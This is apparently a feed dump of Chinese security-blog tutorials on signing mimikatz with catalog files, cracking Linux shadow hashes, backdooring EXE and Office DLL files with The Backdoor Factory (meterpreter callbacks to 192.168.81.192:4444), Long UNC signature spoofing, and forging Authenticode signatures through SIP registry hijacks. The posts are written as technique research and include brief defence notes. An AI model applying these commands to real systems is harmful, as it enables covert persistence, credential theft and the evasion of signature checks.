&lt;hash&gt;ExeFile1=mimikatz.exe 注： txt文件尾部需要一个空行，否则，在接下来的操作会报错，提示文件无法找到 如下图 使用makecat.exe生成cat文件： makecat -v cat.txt 2、使用证书为CAT文件添加签名signtool sign /f Root.pfx /p 123456 makecat1.cat 注： 这里的证书使用的是0x02中生成的证书Root.pfx 3、将cat文件添加到系统的安全编录数据库(管理员权限) signtool catdb -v makecat1.cat 注： 删除使用 -r参数：signtool catdb -r makecat1.cat 如果未添加到系统的安全编录数据库，签名状态为unsigned，如下图 添加到系统的安全编录数据库相当于在目录C:\Windows\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}添加文件makecat1.cat 删除等价于删除目录C:\Windows\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}下对应的CAT文件makecat1.cat 使用signtool.exe获取数字签名： signtool.exe verify /pa /a mimikatz.exe 使用sigcheck.exe获取数字签名： sigcheck.exe -q mimikatz.exe /accepteula 移动位置后，签名仍然有效 如下图 验证结论：移动位置后，CAT文件数字签名不会失效 当然，利用带有CAT文件数字签名的xwizard.exe加载dll，在某种程度上说，能够绕过应用程序白名单的拦截。 0x04 小结 本文介绍了两种数字签名的添加方法，分析CAT文件数字签名的特点，对于可执行文件，通过Process Explorer可验证两种不同的数字签名 如下图 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux下的密码Hash——加密方式与破解方法的技术整理]]></title>
    <url>%2Fposts%2Fb2dd3aa3.html</url>
    <content type="text"><![CDATA[0x00 前言 Linux系统下，用户的密码会被加密保存在文件/etc/shadow中，关于密码的加密方式与破解方法有哪些呢？本文尝试对这一部分内容进行整理，介绍相关基础知识，测试常用方法，帮助大家对此有更直观的认识。 0x01 简介 本文将要介绍以下内容： Linux下用户密码的保存格式 Linux下用户密码的加密方法 破解用户密码hash的常用工具和方法 0x02 Linux下用户密码的保存格式 Linux密码信息保存在两个文件中，分别为：/etc/passwd和/etc/shadow /etc/passwd:普通用户权限能够查看 保存用户信息，每一行代表一个用户，每一行通过冒号：分为七个部分 用户名 密码，x表示密码保存在/etc/shadow UID，0代表root GID，表示所在组 描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other 用户主目录 默认shell类型 eg. test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash 用户名：test2 密码保存在/etc/shadow UID为1001 GID为1001 描述信息： Full Name []: test2 Room Number []: 11111 Work Phone []: 111111-11 Home Phone []: 222222-22 Other []: test 用户主目录为/home/test2 默认shell为/bin/bash /etc/shadow:只有root用户权限能够查看 保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号：分为九个部分 用户名 加密后的密码 上次修改密码的时间(从1970.1.1开始的总天数) 两次修改密码间隔的最少天数，如果为0，则没有限制 两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制 提前多少天警告用户密码将过期 在密码过期之后多少天禁用此用户 用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用 保留 注： 参数说明可通过man shadow获取 eg. test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7::: 用户名：test2 加密后的密码：$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0 上次修改密码的时间(从1970.1.1开始的总天数为17470) 两次修改密码间隔：没有限制 两次修改密码间隔最多的天数：没有限制 提前7天警告用户密码将过期 该用户永久可用 由示例可知，加密的密码具有固定格式： $id$salt$encrypted id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512salt表示密码学中的Salt,系统随机生成encrypted表示密码的hash 0x03 破解用户密码hash的常用工具和方法 由于Linux的密码加密使用了Salt,所以无法使用彩虹表的方式进行破解,常用的方法为字典破解和暴力破解 字典破解和暴力破解的常用工具： 1、John the Ripper(1) 字典破解Kali2.0集成了John the Ripper 字典文件位于/usr/share/john/password.lst 使用Kali Linux上的John自带的密码列表。路径为/usr/share/john/password.lst 使用字典破解： john --wordlist=/usr/share/john/password.lst ./shadow 注： 也可使用其他字典 (2) 暴力破解：john ./shadow 列出已破解的明文密码： john --show ./shadow 结果如下图 2、hashcatKali2.0集成了hashcat 字典文件使用/usr/share/john/password.lst 修改hash格式：只保留$salt$encrypted eg. 原hash： test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7::: 修改后： $6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0 (1) 字典破解：hashcat -m 1800 -o found1.txt --remove shadow /usr/share/john/password.lst 参数说明： -m：hash-type，1800对应SHA-512详细参数可查表：https://hashcat.net/wiki/doku.php?id=example_hashes-o：输出文件–remove：表示hash被破解后将从hash文件移除shadow：代表hash文件/usr/share/john/password.lst：代表字典文件 成功破解出2个hash，如下图 (2) 暴力破解：hashcat -m 1800 -a 3 -o found2.txt shadow ?l?l?l?l --force 参数说明：-a：attack-mode，默认为0，3代表Brute-force，即暴力破解?l：表示小写字母，即abcdefghijklmnopqrstuvwxyz，4个?l代表暴力破解的长度为4?u：表示大写字母，即ABCDEFGHIJKLMNOPQRSTUVWXYZ?h：代表十六进制字符小写，即0123456789?H：代表十六进制字符大写，即0123456789abcdef?s：表示特殊符号，即!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~?a：表示所有字符，即?l?u?d?s?b：表示十六进制，即0x00 - 0xff 成功暴力破解出hash，结果如下图 3、在线网站1.https://hce.iteknical.com/ HCE分布式计算平台,需要积分才能使用 2.http://www.cmd5.com/ 目前暂不支持SHA-512 4、mimipenguin下载地址： https://github.com/huntergregal/mimipenguin 原理类似于mimikatz，通过内存导出明文密码 0x04 小结 本文介绍了Linux下的密码保存格式，测试了两款常用工具：John the Ripper和hashcat，分别使用字典和暴力两种破解方法。 作为一篇总结基础知识的文章，希望能够尽可能的做到简洁实用，欢迎读者补充，后续也会对这部分内容不断进行完善。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用BDF向DLL文件植入后门]]></title>
    <url>%2Fposts%2Fae4f4d03.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《利用BDF向EXE文件植入后门》介绍了使用The Backdoor Factory向EXE文件植入后门的方法，这次将要介绍向DLL文件植入后门的思路，演示一种DLL劫持的利用方法，总结该方法的特点，分析防御思路 0x01 简介 本文将要介绍以下内容： 劫持自己的DLL，修复BUG 劫持系统的DLL，绕过Autoruns的后门检测 0x02 利用思路 DLL同EXE文件的植入思路相同，也是通过修改程序的执行流程，跳转到Code Caves，执行payload，再返回至程序的正常流程 DLL同EXE文件最大的区别是多了导出函数的功能 在实现DLL劫持时，常常需要获得原DLL的导出函数，模拟导出函数，添加payload，实现利用 那么，The Backdoor Factory在DLL文件的后门植入上，是否要考虑导出函数呢？ 下面进行测试，得出结论 0x02 编写程序进行测试 测试Dll testdll.dll： #include &lt;windows.h&gt; #include &lt;stdio.h&gt; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: //MessageBox(NULL, NULL, NULL, 0); //Sleep(5000); printf(&quot;[+] DLL_PROCESS_ATTACH\n&quot;); case DLL_THREAD_ATTACH: printf(&quot;[+] DLL_THREAD_ATTACH\n&quot;); case DLL_THREAD_DETACH: printf(&quot;[+] DLL_THREAD_DETACH\n&quot;); case DLL_PROCESS_DETACH: printf(&quot;[+] DLL_PROCESS_DETACH\n&quot;); break; } return TRUE; } void Export1() { printf(&quot;[+] Export1\n&quot;); } 导出函数为Export1 Dll加载程序 loader.exe： #include &lt;windows.h&gt; typedef void(*Export)(); int main(int argc, char* argv[]) { Export exporttest; printf(&quot;[*] LoadLibrary\n&quot;); HMODULE hDllLib = LoadLibrary(&quot;testdll.dll&quot;); exporttest=(Export)GetProcAddress(hDllLib ,&quot;Export1&quot;); exporttest(); Sleep(10000); FreeLibrary(hDllLib); printf(&quot;[*] FreeLibrary\n&quot;); return 0; } 程序执行如下图，加载testdll.dll，调用导出函数Export1 使用The Backdoor Factory为DLL文件添加后门： msfvenom -p windows/exec CMD=calc.exe -f raw &gt;calc.bin ./backdoor.py -f testdll.dll -s user_supplied_shellcode_threaded -U calc.bin -a 再次执行loader.exe，测试如下图 成功执行payload，但是改变了程序流程，无法正常返回FreeLibrary 需要对DLL进行调试,找到出错的原因 首先生成空的跳转模板： ./backdoor.py -f testdll.dll -s cave_miner_inline 选择.text段 执行Loader.exe，程序一切正常，那么就是中间的payload出了问题 使用Immunity Debugger打开新的testdll.dll，找到劫持的位置，payload保存在0x10005716 如下图 这里可以推测，payload只要能够保持堆栈平衡，那么就不会影响程序的正常执行 接下来，在0x10005716处填入我们的payload 可以使用CFF Explorer添加payload 首先定位payload起始点 PUSHAD PUSHFD 对应的16进制代码为609C 在CFF Explorer中切换到Hex Editor视图，搜索609C,定位起始点0x0000571A 注： 通过Immunity Debugger获得的内存虚拟地址为0x1000571A，二者对应，位置正确 为了扩大payload空间，可以将后面的调整堆栈平衡代码整体后移 如下图 将0x0005772-0x0000579E的数据整体后移，中间填入0x90 选中该部分内容，右键-Copy-Hex 找到合适的位置，右键-Fill With... 完整操作如下图 依此方法，中间填入修改后的payload即可，完成Bug修复 通过Immunity Debugger查看DLL文件，可以看到The Backdoor Factory对DLL和EXE文件进行跳转劫持的位置一样 如下图 得出结论： 对于DLL文件来说，劫持初始化部分造成的结果是在LoadLibrary时即可执行payload，如果想在程序加载DLL导出函数时执行payload，将跳转代码改到导出函数内即可 0x03 劫持系统的DLL 针对Office 2010，分享几个自己找到的DLL劫持利用位置 1、劫持Word-审阅试图LOCALSVC.DLL，位于C:\Program Files\Common Files\microsoft shared\RRLoc14\ 对该dll添加payload ./backdoor.py -f LOCALSVC.DLL -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded 替换dll(需要管理员权限)，启动word.exe，切换至审阅视图，弹回meterpreter 测试如下图 2、劫持word-插入-图片tiptsf.dll，位于C:\Program Files\Common Files\microsoft shared\ink\ 需要TrustedInstaller权限才能替换 关于如何获得TrustedInstaller权限，可参考文章《渗透技巧——Token窃取与利用》 3、劫持word-文件也影响别的位置： word -页面布局-主题-浏览主题 GrooveIntlResource.dll，位于C:\Program Files\Microsoft Office\Office14\2052 需要管理员权限 4、劫持Excel-插入-图片MSPTLS.DLL，位于C:\Program Files\Common Files\microsoft shared\OFFICE14\ 需要管理员权限 以上测试如下图 注: 本节内容仅为了演示DLL劫持的一些利用方法，这些特殊的劫持位置只会在软件的特定功能打开时才会启动，所以能够绕过Autoruns的检测 0x04 防御 对于系统DLL，通过会带有微软签名，如果对DLL植入后门，签名会失效，这是一个老生常谈的问题 而对于第三方开发的软件，调用的第三方DLL不加签名，那么被利用的风险很大 0x05 小结 本文测试了使用The Backdoor Factory向DLL文件植入后门的方法，介绍修复BUG的思路，分享了一种DLL劫持的利用方法，仅供测试，通过总结该利用方法的特点，简要介绍了防御方面需要注意的问题 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用BDF向EXE文件植入后门]]></title>
    <url>%2Fposts%2F41fd133c.html</url>
    <content type="text"><![CDATA[0x00 前言 The Backdoor Factory可用来向可执行文件植入后门，修改程序执行流程，执行添加的payload。 本文将要介绍向EXE文件植入后门的原理，测试The Backdoor Factory植入后门的方法，分析细节，总结思路。 The Backdoor Factory下载地址： https://github.com/secretsquirrel/the-backdoor-factory 0x01 简介 本文将要介绍如下内容： EXE文件后门植入原理 实际测试The Backdoor Factory 分析The Backdoor Factory功能 0x02 基础知识 PE文件格式： 参考资料： https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files Code Caves： 参考资料： https://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves Code Caves的直观认识： 使用vc6.0生成exe文件，查看文件中可利用的Code Caves c代码： #include &quot;stdafx.h&quot; #include &lt;windows.h&gt; #include &lt;stdio.h&gt; int array[200]={1,2,3,4,5,6,7,8,9}; char array2[200]=&quot;123456789ABCDEF&quot;; int main(int argc, char* argv[]) { printf(&quot;hello world&quot;); return 0; } Release编译生成文件，使用Immunity Debugger打开 View-Memory(快捷键Alt+M) 如下图 hello.exe包含四个区段,分别为PE header、.text、.rdata和.data 查看hello.exe的.data段 如下图 发现大段的0x00数据，这些位置可被替换成payload 0x03 文件后门植入原理 植入原理修改程序的执行流程，跳转到Code Caves，执行payload，再返回至程序的正常流程 需要注意的是程序默认只有.text段具有执行权限，如果将payload添加到其他段(如.data或.rdata)，需要将该段添加执行权限 注： 实际使用可通过跳转多个Code Caves拼凑执行payload 利用思路1、新加区段，权限为可读可写可执行(RWE)可使用工具LordPE 手动添加可参考资料： https://www.exploit-db.com/docs/42061.pdf 优点： 简单直接，不需要考虑文件Code Caves的大小 缺点： 增加文件长度 2、使用Code Caves搜索已有区段，寻找是否存在可用的Code Caves，对于不可执行的区段，还需要添加可执行权限 优点： 不改变文件大小 缺点： 需要考虑Code Caves的大小是否满足payload长度 0x04 实际测试The Backdoor Factory Kali 2.0默认集成The Backdoor Factory，路径为usr/share/backdoor-factory 测试系统选为Kali 2.0 为便于测试，测试exe代码如下： #include &lt;windows.h&gt; #include &lt;stdio.h&gt; int array[200]={1,2,3,4,5,6,7,8,9}; char array2[200]=&quot;123456789ABCDEF&quot;; int main(int argc, char* argv[]) { printf(&quot;hello world\n&quot;); system(&quot;PAUSE&quot;); return 0; } 程序输出hello world后暂停 下面挑选The Backdoor Factory中常见的功能进行介绍 1、检查该文件是否适用于The Backdoor Factory./backdoor.py -f test.exe -S 输出如下: [*] Checking if binary is supported [*] Gathering file info [*] Reading win32 entry instructions test.exe is supported. 2、获取该文件的可用payload./backdoor.py -f test.exe -s show 输出如下图 可用payload如下： cave_miner_inline iat_reverse_tcp_inline iat_reverse_tcp_inline_threaded iat_reverse_tcp_stager_threaded iat_user_supplied_shellcode_threaded meterpreter_reverse_https_threaded reverse_shell_tcp_inline reverse_tcp_stager_threaded user_supplied_shellcode_threaded 名称解析： cave_miner_inline: 作为payload模板，长度为135，仅实现了控制流程跳转，不做其他操作，可用作自定义开发shellcode的模板 反汇编的payload格式如下图 reverse_shell_tcp_inline： 对应meterpreter server： use exploit/multi/handler set payload windows/meterpreter/reverse_tcp meterpreter_reverse_https_threaded： 对应meterpreter server： use exploit/multi/handler set payload windows/meterpreter/reverse_https iat_reverse_tcp_inline中的iat： iat为Import Address Table(导入地址表)的缩写，如果PE文件的IAT不包含API LoadLibraryA和GetProcAddress，直接执行payload reverse_shell_tcp_inline会失败，iat_reverse_tcp_inline增加了修复IAT的功能，避免执行失败 user_supplied_shellcode_threaded： 自定义payload，payload可通过msf生成 3、搜索该文件可用的Code Caves./backdoor.py -f test.exe -c 如果payload长度为703，那么Code Caves需要满足长度大于703，参数如下： ./backdoor.py -f test.exe -c -l 703 输出如下图 共找到三个可供利用的位置： No section -&gt;Begin Cave 0x240 -&gt;End of Cave 0x1000 Size of Cave (int) 3520 ************************************************** No section -&gt;Begin Cave 0x693a -&gt;End of Cave 0x700c Size of Cave (int) 1746 ************************************************** We have a winner: .data -&gt;Begin Cave 0x7051 -&gt;End of Cave 0x7350 Size of Cave (int) 767 SizeOfRawData 0x1000 PointerToRawData 0x7000 End of Raw Data: 0x8000 输出的地址为相对虚拟地址(Relative Virtual Address)，即相对于文件头(基地址Image Base)的偏移地址 在内存中的实际地址(虚拟地址Virtual Address)=Image Base+RVA ImageBase = 0x00400000 使用Immunity Debugger查看内存结构，进行验证 内存结构如下图 (1) No section-&gt;Begin Cave 0x240-&gt;End of Cave 0x1000Size of Cave (int) 3520 内存中实际地址为0x00400240-0x00401000，位于PE header中，默认权限为R 查看内存地址数据如下图 (2) No section-&gt;Begin Cave 0x693a-&gt;End of Cave 0x700cSize of Cave (int) 1746 内存中实际地址为0x0040693a-0x0040700c,位于.rdata段中，默认权限为R 查看内存地址数据如下图 (3) We have a winner: .data-&gt;Begin Cave 0x7051-&gt;End of Cave 0x7350Size of Cave (int) 767 内存中实际地址为0x00407051-0x00407350,位于.data段中，默认权限为RW 查看内存地址数据如下图 可以看到，通过The Backdoor Factory找到的Code Caves均符合要求 4、添加payload这里选用reverse_tcp_stager_threaded进行测试，payload长度为703 Server： use exploit/multi/handler set payload windows/meterpreter/reverse_tcp (1) 添加新区段，保存payload./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -o test1.exe 新区段名称为.sdata，权限为RWE 如下图 若指定新添加区段名称为aaa,参数如下： ./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -n aaa -o test1.exe (2) payload保存到.data段中./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test2.exe 根据提示选择.data段 .data段权限更改为RWE，如下图 程序入口点添加跳转代码JMP TEST2.00407055，0x00407055保存添加的payload 如下图 (3) payload保存到其他段中./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test3.exe 根据提示选择PE header，如下图 执行会报错，需要对其进行修复 可使用工具nasm_shell将汇编代码转换为十六进制数据 Kali2.0默认集成nasm_shell 工具使用如下图 (4) 自定义payload生成payload： msfvenom -p windows/messagebox -f raw &gt;msg.bin 添加payload： ./backdoor.py -f test.exe -s user_supplied_shellcode_threaded -U msg.bin -o test4.exe 测试如下图 0x05 小结 本文介绍了使用The Backdoor Factory向EXE文件植入后门的方法，利用Code Caves能够不改变原文件的大小。 当然，该利用方法已经被杀毒软件查杀，本文介绍的内容仅作技术研究。 站在防御的角度，下载文件时需要多加注意，只从可信源下载程序，同时校验文件hash。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Catalog签名伪造——Long UNC文件名欺骗]]></title>
    <url>%2Fposts%2F5140417.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的两篇文章《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》和《Authenticode签名伪造——针对文件类型的签名伪造》介绍了Authenticode签名伪造的利用方法，这次将要介绍一个Catalog签名伪造的方法，利用Long UNC文件名欺骗系统，获得系统内置的Catalog签名 注： 本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。 参考资料： http://www.exploit-monday.com/2013/02/WindowsFileConfusion.html?m=1 0x01 简介 本文将要介绍以下内容： Long UNC基础知识 Long UNC文件名欺骗的方法 Long UNC文件名欺骗优缺点分析 0x02 Long UNC介绍 UNC（Universal Naming Convention）通用命名规则，可用来表示Windows系统中文件的位置 详细介绍可参考如下链接： https://en.wikipedia.org/wiki/Path_(computing) Long UNC正常UNC支持的最大长度为260字符 为了支持更长的字符，引入了Long UNC，支持最大长度为32767 格式举例： \\?\C:\test\a.exe type putty.exe &gt; &quot;\\?\C:\test\longUNC.exe&quot; 如下图，使用Long UNC的文件同普通文件没有区别 特别用法： 如果在Long UNC文件名后面加一个空格，系统对文件名的判断将发生错误 type putty.exe &gt; &quot;\\?\C:\test\mimikatz.exe &quot; 如下图 将putty.exe重命名为&quot;\\?\C:\test\mimikatz.exe &quot;，右键查看&quot;\\?\C:\test\mimikatz.exe &quot;的文件属性 发现了奇怪的地方：属性显示该文件为样本文件mimikatz.exe的属性 直观理解：特殊Long UNC的文件能够欺骗系统，将其识别为另一个文件 0x03 Long UNC文件名欺骗的方法 由上节测试，我们知道利用Long UNC能够复制文件属性 那么，如果复制的是系统文件，甚至是带有catalog签名的文件，是否能实现catalog的签名伪造？ 测试1： 伪造calc.exe的catalog签名测试系统： Win7 x86 使用sigcheck.exe查看calc.exe的catalog签名： sigcheck.exe -i c:\windows\system32\calc.exe 如下图 Long UNC文件伪造: type putty.exe &gt; &quot;\\?\C:\Windows\System32\calc.exe &quot; 注： 输出到c:\windows\system32\需要管理员权限 特殊文件名必须放在目标的同级目录下，即C:\Windows\System32，否则启动失败 如下图，验证结论，特殊Long UNC能够复制文件属性 在之前的文章《Hidden Alternative Data Streams的进阶利用技巧》介绍过特殊文件名可用短文件名代替 获取短文件名： dir /x calc*.exe 如下图 &quot;\\?\C:\Windows\System32\calc.exe &quot;可用短文件名CALC~1.EXE代替 使用sigcheck.exe查看该文件的catalog签名： sigcheck.exe -i &quot;\\?\C:\Windows\System32\calc.exe &quot; or sigcheck.exe -i C:\Windows\System32\CALC~1.EXE 如下图 成功伪造catalog签名 测试2： 执行特殊Long UNC文件1、无法双击执行 2、通过命令行 &quot;\\?\C:\Windows\System32\calc.exe &quot; 提示系统找不到指定的路径 C:\Windows\System32\CALC~1.EXE 启动正常calc.exe 3、通过WMIC wmic process call create C:\Windows\System32\CALC~1.exe 4、通过vbs Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;c:\windows\system32\calc~1.exe&quot; 5、通过js var wsh=new ActiveXObject(&quot;wscript.shell&quot;); wsh.run(&quot;c:\\windows\\system32\\calc~1.exe&quot;); 启动后，进程名为calc~1.exe 特别的地方： 通过Process Explorer验证进程签名，识别为calc.exe的默认微软证书 如下图 注： 关于文件的描述，例如截图中的&quot;SSH, Telnet and Rlogin client&quot;可通过修改程序的资源进行伪造，方法暂略 得出结论： 执行特殊Long UNC文件能够欺骗Process Explorer的进程签名验证 补充： 能够欺骗Sysmon的部分日志监控功能，例如Process creation 测试3： 无法欺骗的工具1、使用certutil.exe计算MD5 certutil.exe -hashfile C:\Windows\System32\calc.exe MD5 certutil.exe -hashfile C:\Windows\System32\calc~1.exe MD5 注： certutil.exe -hashfile &quot;\\?\C:\Windows\System32\calc.exe &quot; MD5 报错提示系统找不到文件 如下图 测试4： 多个同名文件夹的生成type putty.exe &gt; &quot;\\?\C:\Windows\System32\calc.exe &quot; type putty.exe &gt; &quot;\\?\C:\Windows\System32\calc.exe &quot; type putty.exe &gt; &quot;\\?\C:\Windows\System32\calc.exe &quot; 如下图 测试5： 特殊Long UNC文件的删除del &quot;\\?\C:\Windows\System32\calc.exe &quot; or del C:\Windows\System32\CALC~1.exe 测试6： 其他系统测试支持Win7-Win10 64位系统需要注意重定向问题 0x04 利用分析 利用特殊Long UNC文件名欺骗系统对文件路径的判断，实现伪造catalog签名 特点： 欺骗系统对文件名的检查，将文件伪造成系统文件，伪造catalog签名 防御检测： 1、权限控制 欺骗系统文件，需要有系统文件夹的可写权限 2、文件识别 同级目录同名文件 3、进程名判断 特殊进程名，格式为短文件名，例如CALC~1.EXE 4、工具检测 使用certutil.exe校验文件hash 0x05 小结 本文介绍了利用特殊Long UNC文件名欺骗系统并获得Catalog签名的技巧，分析利用方法，分享防御思路 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Authenticode签名伪造——针对文件类型的签名伪造]]></title>
    <url>%2Fposts%2F986b783e.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》介绍了针对单一文件的Authenticode签名伪造，需要在文件尾部添加伪造的签名数据，这次将介绍另一种签名伪造方式：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。 注： 本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。 参考资料： https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view 0x01 简介 本文将要介绍以下内容： 针对powershell脚本的签名伪造方法 针对PE文件的签名伪造方法 针对其他类型文件的签名伪造方法 添加代码实现对特定文件的签名伪造 0x02 针对powershell脚本的签名伪造方法 前提是powershell脚本需要包含一个签名(自己生成的签名会被识别为无效)，下面介绍如何将该无效签名伪造成有效的微软签名 生成测试证书： makecert -n &quot;CN=Microsoft Windows Test1&quot; -r -eku 1.3.6.1.5.5.7.3.3 -sv certtest.pvk certtest.cer cert2spc certtest.cer certtest.spc pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f 不需要注册该证书 注： 使用makecert.exe要加参数： -eku 1.3.6.1.5.5.7.3.3 否则提示证书无法用于代码签名，具体错误如下： Set-AuthenticodeSignature : Cannot sign code. The specified certificate is not suitable for code signing. 如下图 给powershell脚本签名： $cert = Get-PfxCertificate certtest.pfx Set-AuthenticodeSignature -Filepath 1.ps1 -Cert $cert 验证证书： Get-AuthenticodeSignature .\1.ps1 提示UnknownError，表示文件签名无效 如下图 修改注册表，命令如下： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;AutoApproveHash&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;GetLegitMSSignature&quot; /f 再次验证： Get-AuthenticodeSignature .\1.ps1 显示Valid，签名有效 如下图 注： 不同系统下相同名称的文件签名不同 AFDD80C4EBF2F61D3943F18BB566D6AA6F6E5033为Matt Graeber测试系统中的notepad.exe签名hash 现在在我们自己的系统进行测试：Win10 x64 分别获取notepad.exe的签名信息： Get-AuthenticodeSignature c:\windows\system32\notepad.exe sigcheck -i C:\Windows\System32\notepad.exe 可以发现sigcheck的输出内容中，Thumbprint对应文件签名hash，如下图 接下来，将测试系统改为Win7 x86 在Win7下使用Get-AuthenticodeSignature无法获得notepad.exe的签名信息(catalog签名) 如下图 但可以通过sigcheck获得，如下图 hash为：018B222E21FBB2952304D04D1D87F736ED46DEA4 定位cat文件路径：C:\Windows\system32\CatRoot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntexe.cat .cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，在线网址如下： https://lapo.it/asn1js/ 选择cat文件后即可解密显示完整格式 格式解析可参考： https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography 将该文件替换PoCSubjectInterfacePackage工程中的MS_cert.bin，重新编译 配置注册表 打开一个新的cmd，查看powershell脚本签名： Get-AuthenticodeSignature .\1.ps1 同sighcheck获取的hash值保持一致，如下图 powershell脚本的Authenticode签名伪造成功 对以上操作直观的理解： 该方法是通过修改系统证书验证过程，使文件将指定的catalog签名作为自己的Authenticode签名 当然，所有带签名的powershell脚本均会统一成hash为018B222E21FBB2952304D04D1D87F736ED46DEA4的签名，这就带来了一个问题：这样会影响正常系统文件的签名校验 我们可以看到，通过这种方式伪造的签名会作用于所有powershell脚本，那么，我们能否针对特定powershell脚本作伪造呢？ 以Matt Graeber开源的工程PoCSubjectInterfacePackage作为模板进行修改，下载地址如下： https://github.com/mattifestation/PoCSubjectInterfacePackage 重点关注函数GetLegitMSSignature，在线地址： https://github.com/mattifestation/PoCSubjectInterfacePackage/blob/master/MySIP/MySIP.c#L138 查看结构SIP_SUBJECTINFO *pSubjectInfo的参数说明，地址如下： https://msdn.microsoft.com/en-us/library/windows/desktop/bb736434(v=vs.85).aspx pwsFileName和pwsDisplayName均能够表示文件名称，所以可通过MessageBox进行验证 函数GetLegitMSSignature内添加如下代码： MessageBox (NULL, pSubjectInfo-&gt;pwsFileName, pSubjectInfo-&gt;pwsDisplayName,0); 进行测试，成功获得传入文件名，如下图 接下来的思路： 对传入的文件名称进行判断，满足条件的文件加载对应的catalog签名，最终实现对特定文件的签名伪造 筛选文件的代码如下： if(lstrcmpi((LPCTSTR)pSubjectInfo-&gt;pwsFileName,L&quot;C:\\test\\cer\\1.ps1&quot;)==0) { MessageBox (NULL,L&quot;Get selected file&quot;, (LPCTSTR)pSubjectInfo-&gt;pwsFileName,0) ; } 完整代码可参考： https://raw.githubusercontent.com/3gstudent/test/master/MySIP.c 当前文件为C:\test\cer\1.ps1时，符合条件，进行签名伪造，否则放弃 测试如下图 成功实现对特定文件的签名伪造，这种方式的优点是不需要在文件尾部添加Authenticode签名，不改变文件hash 当然，这仅仅是一个POC，还要对系统文件的签名验证做判断 0x03 针对PE文件的签名伪造方法 参考这个列表： C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog .cat文件 9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctl文件 C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cab文件 如果替换exe文件的校验，即CryptSIPDllVerifyIndirectData和CryptSIPDllGetSignedDataMsg，命令如下： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 